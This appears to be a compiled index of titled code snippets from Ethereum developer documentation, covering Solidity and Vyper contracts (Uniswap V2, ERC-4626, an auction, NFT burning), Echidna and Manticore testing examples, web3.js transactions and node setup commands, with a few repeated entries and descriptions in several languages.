totalPlayedCount\n      hasWonCount\n      hasLostCount\n      bets {\n        time\n      }\n    }\n`\n\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Creating Address Mapping Type for Multiple Blockchains\nDESCRIPTION: Defines a TypeScript type for mapping blockchain chain IDs to contract addresses, allowing the dApp to work with the same contract on different networks.\n\nLANGUAGE: tsx\nCODE:\n```\ntype AddressPerBlockchainType = {\n  [key: number]: AddressType\n}\n```\n\n----------------------------------------\n\nTITLE: Example Corpus JSON from Echidna\nDESCRIPTION: An example of a corpus file generated by Echidna, which records transaction details, including function calls and parameters.\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"_gas'\": \"0xffffffff\",\n    \"_delay\": [\"0x13647\", \"0xccf6\"],\n    \"_src\": \"00a329c0648769a73afac7f9381e08fb43dbea70\",\n    \"_dst\": \"00a329c0648769a73afac7f9381e08fb43dbea72\",\n    \"_value\": \"0x0\",\n    \"_call\": {\n      \"tag\": \"SolCall\",\n      \"contents\": [\n        \"magic\",\n        [\n          {\n            \"contents\": [\n              256,\n              \"93723985220345906694500679277863898678726808528711107336895287282192244575836\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [256, \"334\"],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [\n              256,\n              \"68093943901352437066264791224433559271778087297543421781073458233697135179558\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"tag\": \"AbiUInt\",\n            \"contents\": [256, \"332\"]\n          }\n        ]\n      ]\n    },\n    \"_gasprice'\": \"0xa904461f1\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Solidity Contract with Variable Gas Consumption\nDESCRIPTION: A sample Solidity contract demonstrating varying gas costs based on array operations. Contains functions to push, pop, clear, and check elements in an array, with the check function having potentially high gas consumption when the array grows.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing create-eth-app with Yarn\nDESCRIPTION: Commands to install and run create-eth-app, which requires Yarn 0.25 or newer. This creates a new Ethereum application and starts the development server.\n\nLANGUAGE: bash\nCODE:\n```\nyarn create eth-app my-eth-app\ncd my-eth-app\nyarn react-app:start\n```\n\n----------------------------------------\n\nTITLE: Creating a Non-Contract Account with Manticore API\nDESCRIPTION: Python code to create a user account with a specified balance using the Manticore API. This account can be used to interact with smart contracts.\n\nLANGUAGE: python\nCODE:\n```\nuser_account = m.create_account(balance=1000)\n```\n\n----------------------------------------\n\nTITLE: Displaying Warning Information Banner in Markdown\nDESCRIPTION: An information banner component with a warning style that alerts users about the experimental nature of AI agents and related tools.\n\nLANGUAGE: jsx\nCODE:\n```\n<InfoBanner isWarning emoji=\"💡\">\n<p className=\"mt-0\"><strong>Good to know</strong></p>\n<p className=\"mt-2\">AI agents and related tools are still in early development and very experimental—use with caution.</p>\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Running the Example Application\nDESCRIPTION: Command to execute the index.js file which demonstrates writing to and reading from the WORM cache.\n\nLANGUAGE: shell\nCODE:\n```\nnode index.js\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens in Uniswap V2\nDESCRIPTION: This function mints liquidity tokens when a liquidity provider adds funds to the pool. It calculates the amount of tokens to mint based on the current reserves and contributions. For the first deposit, tokens are minted based on the geometric mean of deposits, while subsequent deposits use the lesser of the two proportions to ensure fair valuation.\n\nLANGUAGE: solidity\nCODE:\n```\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Corpus Collection\nDESCRIPTION: Command to run Echidna with corpus collection enabled via the configuration file.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test magic.sol --config config.yaml\n```\n\n----------------------------------------\n\nTITLE: Header Casing in Ethereum Documentation\nDESCRIPTION: Guidelines for using sentence casing in headers where only the first word and proper nouns are capitalized.\n\nLANGUAGE: markdown\nCODE:\n```\n<!-- Good -->\n\n## Minting your NFT\n\n### Setting up your wallet\n\n### Get enough ether\n\n<!-- Bad -->\n\n## Minting Your NFT\n\n### Setting Up Your Wallet\n\n### Getting Enough ether\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Gas Estimation\nDESCRIPTION: YAML configuration that enables gas estimation in Echidna to find transactions with high gas consumption.\n\nLANGUAGE: yaml\nCODE:\n```\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Name Registration System in Python for Ethereum\nDESCRIPTION: This code implements a simple Namecoin-like name registration system on Ethereum. The function allows users to register a name with an associated value in storage, but only if the name hasn't been registered before. Once registered, the entry cannot be modified or deleted.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Testing Cached Parameter Writing in Solidity Contract\nDESCRIPTION: Test function that demonstrates caching and using parameters for write operations. It uses the cacheWrite function to store a value and retrieves the cache key for later use.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction testReadWriteCached() public {\n        uint cacheGoat = worm.cacheWrite(0x60A7);\n```\n\n----------------------------------------\n\nTITLE: SPDX License Identifier Declaration for Optimism Bridge\nDESCRIPTION: Specifies the MIT license that applies to most Optimism code. This license declaration is standard for Solidity contracts and indicates the terms under which the code can be used and distributed.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\n```\n\n----------------------------------------\n\nTITLE: Complete Manticore Execution Example in Python\nDESCRIPTION: A full example showing how to set up Manticore, create accounts, deploy a contract, execute a function with symbolic input, and finalize the exploration.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nprint(\"Results are in {}\".format(m.workspace))\nm.finalize() # stop the exploration\n```\n\n----------------------------------------\n\nTITLE: Retrieving Total Assets in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the total amount of underlying assets held by the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalAssets() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Name Registration System in Python for Ethereum\nDESCRIPTION: This code implements a simple Namecoin-like name registration system on Ethereum. The function allows users to register a name with an associated value in storage, but only if the name hasn't been registered before. Once registered, the entry cannot be modified or deleted.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transactions with Manticore\nDESCRIPTION: Shows how to execute a raw transaction in Manticore, allowing for concrete or symbolic values for caller, address, data, and value parameters.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\n----------------------------------------\n\nTITLE: Defining Function Signature Constants for Manual Calls in Solidity\nDESCRIPTION: Creates a constant to store the function signature for easier manual call data construction when not using standard ABI specifications.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Make it easier to call us\n    // Function signature for writeEntryCached(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0xe4e4f2d3\n    bytes4 constant public WRITE_ENTRY_CACHED = 0xe4e4f2d3;\n```\n\n----------------------------------------\n\nTITLE: Creating and Hashing EIP-712 Typed Data for Permit Verification\nDESCRIPTION: Constructs and hashes the typed data structure according to EIP-712 standards, combining domain separator with permit-specific data including owner, spender, value, nonce, and deadline. Increments the nonce to prevent replay attacks.\n\nLANGUAGE: solidity\nCODE:\n```\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n            )\n        );\n```\n\n----------------------------------------\n\nTITLE: Accessing Prometheus/Grafana Monitoring Dashboards\nDESCRIPTION: Instructions for accessing the monitoring dashboards for Ethereum nodes through a web browser, including the URL, username, and password.\n\nLANGUAGE: bash\nCODE:\n```\nURL: http://your_raspberrypi_IP:3000\nUser: admin\nPassword: ethereum\n```\n\n----------------------------------------\n\nTITLE: Defining CalldataInterpreter Contract with Token Variable\nDESCRIPTION: Definition of the CalldataInterpreter contract with an immutable reference to the token it will interact with.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract CalldataInterpreter {\n\n    OrisUselessToken public immutable token;\n```\n\n----------------------------------------\n\nTITLE: Initializing Manticore in Python\nDESCRIPTION: Python code to import and initialize the Manticore Ethereum Virtual Machine for smart contract analysis through the API.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n```\n\n----------------------------------------\n\nTITLE: Referencing PUSH0 Instruction in Shanghai EIP\nDESCRIPTION: Codice che fa riferimento all'EIP-3855 che introduce la nuova istruzione PUSH0 nell'aggiornamento Shanghai.\n\nLANGUAGE: html\nCODE:\n```\n<code>PUSH0</code>\n```\n\n----------------------------------------\n\nTITLE: Test Contract Setup with Test Fixture\nDESCRIPTION: Defines the test contract and its setup function that creates a new Cache instance before each test to ensure isolated testing environments.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract CacheTest is Test {\n    Cache cache;\n\n    function setUp() public {\n        cache = new Cache();\n    }\n```\n\n----------------------------------------\n\nTITLE: Executing npm commands for React NFT Minter Project Setup\nDESCRIPTION: Terminal commands for setting up the React project environment by navigating to the project directory, installing dependencies with npm install, and starting the development server with npm start.\n\nLANGUAGE: bash\nCODE:\n```\ncd minter-starter-files\nnpm install\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Implementando un Contrato de Subasta Simple en Solidity\nDESCRIPTION: Este fragmento muestra las funciones principales de un contrato de subasta en Solidity, incluyendo el constructor, la función de oferta, retiro de fondos y finalización de la subasta. Permite a los usuarios realizar ofertas, donde solo la oferta más alta es aceptada, y las ofertas anteriores pueden ser retiradas por sus dueños.\n\nLANGUAGE: solidity\nCODE:\n```\nconstructor(\n        uint biddingTime,\n        address payable beneficiaryAddress\n    ) {\n        beneficiary = beneficiaryAddress;\n        auctionEndTime = block.timestamp + biddingTime;\n    }\n\nfunction bid() external payable {\n\n      if (block.timestamp > auctionEndTime)\n            revert AuctionAlreadyEnded();\n\n      if (msg.value <= highestBid)\n            revert BidNotHighEnough(highestBid);\n\n if (highestBid != 0) {\n    pendingReturns[highestBidder] += highestBid;\n        }\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n        emit HighestBidIncreased(msg.sender, msg.value);\n    }\n\n function withdraw() external returns (bool) {\n        uint amount = pendingReturns[msg.sender];\n        if (amount > 0) {\n           pendingReturns[msg.sender] = 0;\n\n        if (!payable(msg.sender).send(amount)) {\n                pendingReturns[msg.sender] = amount;\n                return false;\n            }\n        }\n        return true;\n    }\n\nfunction auctionEnd() external {\n       if (block.timestamp < auctionEndTime)\n            revert AuctionNotYetEnded();\n        if (ended)\n            revert AuctionEndAlreadyCalled();\n\n        ended = true;\n        emit AuctionEnded(highestBidder, highestBid);\n\n        beneficiary.transfer(highestBid);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Stack Manipulation and Jump\nDESCRIPTION: This bytecode section manipulates the stack and performs a jump to continue the execution flow at offset 0x01A7 for handling the ETH transfer logic.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila                                          |\n| ------:| ------------------- | --------------------------------------------- |\n|     6C | PUSH2 0x0075        | 0x75 Value\\* CALLVALUE 0 6 CALLVALUE        |\n|     6F | SWAP2               | CALLVALUE Value\\* 0x75 0 6 CALLVALUE        |\n|     70 | SWAP1               | Value\\* CALLVALUE 0x75 0 6 CALLVALUE        |\n|     71 | PUSH2 0x01a7        | 0x01A7 Value\\* CALLVALUE 0x75 0 6 CALLVALUE |\n|     74 | JUMP                |                                               |\n```\n\n----------------------------------------\n\nTITLE: Running the JavaScript Client Application\nDESCRIPTION: Command to execute the JavaScript client that demonstrates writing to and reading from the WORM contract.\n\nLANGUAGE: shell\nCODE:\n```\nnode index.js\n```\n\n----------------------------------------\n\nTITLE: Burning NFT Tokens in Vyper\nDESCRIPTION: Function to burn (destroy) an existing NFT token. It requires the caller to be either the owner or authorized to manage the token, and removes the token from circulation.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Printing Contract ABI to Console for Debugging in JavaScript\nDESCRIPTION: Outputs the contract ABI in JSON format to the console for inspection and debugging purposes.\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(JSON.stringify(contract.abi))\n```\n\n----------------------------------------\n\nTITLE: Minting Shares in ERC-4626 Vault\nDESCRIPTION: The mint function allows users to mint a specific amount of vault shares by depositing the required underlying assets, with the shares assigned to the specified receiver address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(uint256 shares, address receiver) public returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Total Supply Variable in ERC20 Contract\nDESCRIPTION: This variable stores the total number of tokens in circulation. It is updated when tokens are minted or burned in the contract.\n\nLANGUAGE: solidity\nCODE:\n```\n    uint256 private _totalSupply;\n```\n\n----------------------------------------\n\nTITLE: Printing Contract ABI to Console for Debugging in JavaScript\nDESCRIPTION: Outputs the contract ABI in JSON format to the console for inspection and debugging purposes.\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(JSON.stringify(contract.abi))\n```\n\n----------------------------------------\n\nTITLE: Rendering Timeline Component in React/JSX\nDESCRIPTION: A component that displays important dates for the 2024 Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<DatesAndTimeline />\n```\n\n----------------------------------------\n\nTITLE: Utilisation des hooks React avec Apollo pour les requêtes GraphQL\nDESCRIPTION: Exemple d'utilisation du hook useQuery d'Apollo pour récupérer des données à partir d'un subgraph The Graph dans un composant React. Le code montre comment gérer les états de chargement, d'erreur et de données.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Previewing Mint Result in ERC-4626 Vault\nDESCRIPTION: This method simulates the effect of a mint operation in the current block, allowing users to preview how many assets would be required to mint a specified amount of shares.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewMint(uint256 shares) public view returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Implementing Light-Client Block Verification in Python\nDESCRIPTION: A light-client friendly version of the verification algorithm that doesn't require the full DAG. It uses quick_hashimoto to compute the result, enabling verification on devices with limited resources.\n\nLANGUAGE: python\nCODE:\n```\ndef light_verify(params, header, nonce):\n    seedset = get_seedset(params, block)\n    result = quick_hashimoto(seedset[\"front_hash\"], get_dagsize(params, block),\n                             params, decode_int(block.prevhash), nonce)\n    return result * params[\"diff\"] < 2**256\n```\n\n----------------------------------------\n\nTITLE: Storage Lookup Table Access in 0x81e580d3\nDESCRIPTION: The code that prepares memory and accesses a lookup table in storage when the parameter validation succeeds, using the SHA3 hash of a memory segment as part of the storage address calculation.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n17E | JUMPDEST   | calldataload(4) 0x04 calldataload(4) 0xDA\n17F | PUSH1 0x00 | 0x00 calldataload(4) 0x04 calldataload(4) 0xDA\n181 | SWAP2      | 0x04 calldataload(4) 0x00 calldataload(4) 0xDA\n182 | DUP3       | 0x00 0x04 calldataload(4) 0x00 calldataload(4) 0xDA\n183 | MSTORE     | calldataload(4) 0x00 calldataload(4) 0xDA\n```\n\n----------------------------------------\n\nTITLE: Identifying MicroSD Card Name before Flashing\nDESCRIPTION: Shell command to list all disk devices to identify the correct name of the MicroSD card that will be flashed. This step is crucial to ensure the correct device is targeted.\n\nLANGUAGE: shell\nCODE:\n```\n# check the MicroSD card name\nsudo fdisk -l\n\n>> sdxxx\n```\n\n----------------------------------------\n\nTITLE: Identifying MicroSD Card Name before Flashing\nDESCRIPTION: Shell command to list all disk devices to identify the correct name of the MicroSD card that will be flashed. This step is crucial to ensure the correct device is targeted.\n\nLANGUAGE: shell\nCODE:\n```\n# check the MicroSD card name\nsudo fdisk -l\n\n>> sdxxx\n```\n\n----------------------------------------\n\nTITLE: Calculating Gas Price to Offset ETH Issuance (Math in Markdown)\nDESCRIPTION: Mathematical formula for determining the gas price in gwei needed to offset the daily ETH issuance of 1,700 ETH. This calculation factors in block count, gas target per block, and conversion rates.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7.200 blocos/dia * 15x10^6 gás/bloco *`**`Y gwei/gás`**`* 1 ETH/ 10^9 gwei = 1.700 ETH/dia`\n\nResolvendo para `Y`:\n\n- `Y = (1.700(10^9))/(7.200 * 15(10^6)) = (17x10^3)/(72 * 15) = 16 gwei` (arredondamento para apenas dois dígitos significativos)\n```\n\n----------------------------------------\n\nTITLE: Burning Liquidity Tokens in Uniswap V2 (Function Signature)\nDESCRIPTION: Function signature for burning liquidity tokens when a provider withdraws liquidity. Like mint, this should be called from a peripheral contract that performs safety checks.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction burn(address to) external lock returns (uint amount0, uint amount1) {\n```\n\n----------------------------------------\n\nTITLE: Setting Up and Sending an Ethereum Transaction with Web3.js\nDESCRIPTION: This code creates an Ethereum transaction that sends 1 ETH back to the Sepolia faucet. It includes steps to retrieve the nonce, configure transaction parameters, sign the transaction with a private key, and send it to the network via Alchemy API.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n    require('dotenv').config();\n    const { API_URL, PRIVATE_KEY } = process.env;\n    const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\n    const web3 = createAlchemyWeb3(API_URL);\n    const myAddress = '0x610Ae88399fc1687FA7530Aac28eC2539c7d6d63' //TODO: replace this address with your own public address\n\n    const nonce = await web3.eth.getTransactionCount(myAddress, 'latest'); // nonce starts counting from 0\n\n    const transaction = {\n     'to': '0x31B98D14007bDEe637298086988A0bBd31184523', // faucet address to return eth\n     'value': 1000000000000000000, // 1 ETH\n     'gas': 30000,\n     'nonce': nonce,\n     // optional data field to send message or execute smart contract\n    };\n\n    const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\n    web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\n    if (!error) {\n      console.log(\"🎉 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n    } else {\n      console.log(\"❗Something went wrong while submitting your transaction:\", error)\n    }\n   });\n}\n\nmain();\n```\n\n----------------------------------------\n\nTITLE: Configuring Echidna for Gas Estimation\nDESCRIPTION: YAML configuration for enabling gas consumption measurement in Echidna. This configuration also sets a short sequence length to make the results easier to analyze.\n\nLANGUAGE: yaml\nCODE:\n```\nseqLen: 2\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Creating and Sending a Faucet Transaction with Custom Calldata\nDESCRIPTION: Creates a transaction to call the faucet function using the shortened calldata format (0x01) and verifies the token balance after execution.\n\nLANGUAGE: javascript\nCODE:\n```\n    // Get tokens to play with\n    const faucetTx = {\n      to: cdi.address,\n      data: \"0x01\"\n    }\n    await (await signer.sendTransaction(faucetTx)).wait()\n    \n    // Check the faucet provides the tokens correctly\n    expect(await token.balanceOf(signer.address)).to.equal(1000)\n```\n\n----------------------------------------\n\nTITLE: Setting Up a dApp Development Environment with Hardhat\nDESCRIPTION: Command to clone a sample Blackjack dApp repository and install its dependencies for connecting to the local Ethereum testnet created with Kurtosis.\n\nLANGUAGE: python\nCODE:\n```\ngit clone https://github.com/kurtosis-tech/awesome-kurtosis.git && cd awesome-kurtosis/smart-contract-example && yarn\n```\n\n----------------------------------------\n\nTITLE: GitHub Pull Request Query for EIP Reviews\nDESCRIPTION: A GitHub query URL that filters open pull requests with the 'e-review' tag in the Ethereum EIPs repository. This is provided as a resource for those who want to participate in peer-reviewing Ethereum Improvement Proposals.\n\nLANGUAGE: url\nCODE:\n```\nhttps://github.com/ethereum/EIPs/pulls?q=is%3Apr+is%3Aopen+label%3Ae-review\n```\n\n----------------------------------------\n\nTITLE: Defining React Component Props Structure in TypeScript\nDESCRIPTION: This snippet demonstrates the recommended pattern for defining React component props in the Ethereum project. It shows how to properly type components, destructure props, and handle forwarded refs using Chakra UI's forwardRef.\n\nLANGUAGE: tsx\nCODE:\n```\ntype ComponentProps = {\n  // Prop types\n}\n\n// Destructure props at the declaration and use the name `props` when using the spread operator for the remaining props not specifically needed\nconst Component = ({ title, label, ...props }: ComponentProps) => {\n  // Component code\n}\n\n/**\n * Components using `forwardRef` from the Chakra UI package\n *\n * The first argument of the generic types is the props type signature.\n *\n * For the second argument of the generic types, you are declaring the primary element type that the component will render.\n * This could be a `div`, `span`, `button`, etc. or a custom component (typeof Button) if said component is being used in the return.\n */\nconst Component = forwardRef<ComponentProps, \"div\">(\n  ({ title, label, ...props }, ref) => {\n    // Component code\n  }\n)\n```\n\n----------------------------------------\n\nTITLE: Displaying Client-Server Architecture for Web 1.0 in Markdown\nDESCRIPTION: Markdown image tag showing the client-server architecture representing Web 1.0, used to illustrate the read-only nature of the early internet.\n\nLANGUAGE: markdown\nCODE:\n```\n![Client-Server-Architektur, die Web 1.0 darstellt](./web1.png)\n```\n\n----------------------------------------\n\nTITLE: GitHub Issue Creation Button in Markdown\nDESCRIPTION: A ButtonLink component that directs users to create a new GitHub issue for submitting content resources to ethereum.org. The link includes predefined parameters to properly categorize the issue as a feature request.\n\nLANGUAGE: markdown\nCODE:\n```\n<ButtonLink href=\"https://github.com/ethereum/ethereum-org-website/issues/new?assignees=&labels=Type%3A+Feature&template=feature_request.yaml&title=\">\n  Create an issue\n</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Querying Average Daily Gas Limits for Ethereum Blocks SQL\nDESCRIPTION: SQL query that retrieves the average gas limit per day for Ethereum blocks since 2016. This represents the supply side of block space available for transactions.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_limit) AS avg_block_gas_limit\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Modifying Zero-Knowledge Proof to Test Wrong Answer\nDESCRIPTION: Code modification to test what happens when an incorrect answer is provided in the zero-knowledge proof, which should cause the verification to fail.\n\nLANGUAGE: typescript\nCODE:\n```\nproof.inputs[3] = \"0x\" + \"1\".padStart(64, \"0\")\n```\n\n----------------------------------------\n\nTITLE: Updating Smart Contract State\nDESCRIPTION: Code that calls the update function on the smart contract to change the stored message value and waits for the transaction to be mined.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"This is the new message.\")\n  await tx.wait()\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Specifying Solidity Version Compatibility\nDESCRIPTION: Declares the compatible Solidity compiler versions for the contract, ensuring it works with versions between 0.6.0 and 0.8.0. This prevents compilation with incompatible versions that might break functionality.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.6.0 <0.8.0;\n```\n\n----------------------------------------\n\nTITLE: IL1StandardBridge Interface Definition\nDESCRIPTION: Defines the IL1StandardBridge interface which extends IL1ERC20Bridge to add ETH transfer capabilities. This separation allows custom token bridges to implement only the ERC-20 functionality if needed.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\nimport \"./IL1ERC20Bridge.sol\";\n\n/**\n * @title IL1StandardBridge\n */\ninterface IL1StandardBridge is IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n    event ETHDepositInitiated(\n        address indexed _from,\n        address indexed _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Running Echidna Fuzzer with Basic Command\nDESCRIPTION: This command runs Echidna against the magic.sol smart contract to test the properties defined inside it.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol\n```\n\n----------------------------------------\n\nTITLE: Transferring Liquidity Tokens and Burning LP Tokens in Uniswap V2\nDESCRIPTION: Transfers liquidity tokens from the sender to the pair contract and calls the burn function to return tokens to the specified recipient. This is part of the liquidity removal process.\n\nLANGUAGE: solidity\nCODE:\n```\naddress pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\nIUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n(uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n```\n\n----------------------------------------\n\nTITLE: Returning Zokrates Functions\nDESCRIPTION: Returns the necessary functions and data for the application to use zero-knowledge operations.\n\nLANGUAGE: typescript\nCODE:\n```\nreturn {\n    zkDig,\n    calculateMapHash,\n    solidityVerifier,\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Incrementing a Counter through CounterFactory in Solidity\nDESCRIPTION: Function to increment a user's Counter contract. It checks that the Counter exists and passes the original caller's address to the Counter's increment function to maintain proper access control.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction increment() public {\n      require (_counters[msg.sender] != Counter(0));\n      Counter(_counters[msg.sender]).increment(msg.sender);\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring Environment Variables for Ethereum Development\nDESCRIPTION: Environment variable setup for connecting to the Ethereum testnet. This example shows how to structure a .env file that stores the Alchemy API URL and MetaMask private key needed for contract deployment.\n\nLANGUAGE: plaintext\nCODE:\n```\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/your-api-key\"\nPRIVATE_KEY = \"your-metamask-private-key\"\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Approval Function Implementation in EVM Bytecode\nDESCRIPTION: EVM bytecode implementing the approval functionality of ERC-20 tokens. Includes checks for invalid addresses and emits the Approval event after updating allowance mappings in storage.\n\nLANGUAGE: ethereum-bytecode\nCODE:\n```\nPUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT\n```\n\n----------------------------------------\n\nTITLE: Kurtosis Ethereum Testnet Initialization Output\nDESCRIPTION: Example output from Kurtosis after successfully creating a local Ethereum testnet, showing the created enclave with its file artifacts and running services including EL and CL clients.\n\nLANGUAGE: python\nCODE:\n```\nINFO[2023-04-04T18:09:44-04:00] ======================================================\nINFO[2023-04-04T18:09:44-04:00] ||          Created enclave: local-eth-testnet      